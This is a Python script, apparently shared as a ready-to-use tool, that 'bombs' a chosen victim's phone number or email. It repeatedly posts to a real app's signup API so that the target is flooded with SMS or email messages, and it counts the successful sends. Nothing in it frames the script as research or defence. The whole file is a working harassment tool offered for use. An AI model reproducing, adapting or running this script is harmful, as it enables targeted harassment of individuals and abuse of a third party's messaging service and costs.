import os
import sys
import subprocess

# ✅ Check Python version
if sys.version_info < (3, 7):
    print("❌ Python 3.7 or higher is required. Exiting.")
    sys.exit(1)

# ✅ Auto-install aiohttp if missing
try:
    import aiohttp
except ImportError:
    print("🔄 'aiohttp' not found. Installing it now...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "aiohttp"])
    import aiohttp

import asyncio

API_URL = "https://prod.fitflexapp.com/api/users/signupV1"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

async def send_bomb(session, method, target):
    payload = {
        "type": "msisdn" if method == "phone" else "email",
        "user_platform": "Android",
        "country_id": "162",
        "msisdn": target if method == "phone" else "",
        "email": target if method == "email" else ""
    }
    try:
        async with session.post(API_URL, json=payload, timeout=10) as resp:
            return resp.status == 200
    except:
        return False

async def bomber(method):
    target = input("\n🎯 ENTER YOUR VICTIM " + ("NUMBER (e.g. +923001234567): " if method == "phone" else "EMAIL: "))
    count = int(input("🔁 ENTER AMOUNT OF BOMBING: "))
    delay = float(input("⏱️ ENTER SCE OF DELAYS (seconds): "))

    success = 0
    failed = 0

    async with aiohttp.ClientSession() as session:
        for i in range(count):
            ok = await send_bomb(session, method, target)
            if ok:
                success += 1
            else:
                failed += 1

            percent = int((i + 1) / count * 100)
            bar = "█" * (percent // 10) + "░" * (10 - percent // 10)
            print(f"\r📡 Progress: [{bar}] {percent}% | ✅ {success} ❌ {failed} | think sharp...stay Winning", end="")
            await asyncio.sleep(delay)

    print(f"\n\n✅ DONE!\nTotal Sent: {count}\n🟢 Success: {success}, 🔴 Failed: {failed}\n")
    print("Thanks to Winning !!! @UOS IT Dept ")

async def main():
    clear()
    print("╔════════════════════════════╗")
    print("║          Growth begins     ║")
    print("║     with a doubt....       ║")
    print("╚════════════════════════════╝\n")

    print("📱 ENTER 1 TO SMS BOMBING")
    print("✉️  ENTER 2 TO EMAIL BOMBING")
    choice = input("\n🎯 ENTER YOUR CHOICE: ").strip()

    if choice == "1":
        await bomber("phone")
    elif choice == "2":
        await bomber("email")
    else:
        print("❌ Invalid choice. Exiting...")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🚫 Tool stopped by user.")
